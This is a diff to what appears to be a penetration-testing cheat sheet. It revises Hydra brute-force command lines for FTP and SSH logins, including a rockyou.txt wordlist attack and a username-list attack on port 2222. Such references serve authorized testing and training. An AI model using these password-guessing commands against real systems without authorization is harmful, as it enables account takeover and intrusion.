@@ -20,11 +20,9 @@ $ hydra -L /dir/users.txt -P /dir/passlist.txt ftp://[IP_Address]
 
 ## SSH
 
-$ hydra -l <username> -P full path to passlist.txt IP Address Target -t 4 ssh
+$ hydra -f -l user_name -P /usr/share/wordlists/rockyou.txt Target_IP -t 4 ssh
 
-$ hydra -L full path to usernamelist.txt -P full path to passlist.txt> ssh://IP_Address:22
-
-$ hydra -f -l user -P /usr/share/wordlists/rockyou.txt IP Address Target -t 4 ssh
+$ hydra -L /full/path_to/usernamelist.txt -P /full/path_to/passlist.txt ssh://IP_Address:2222
 
 ## MySQL
 
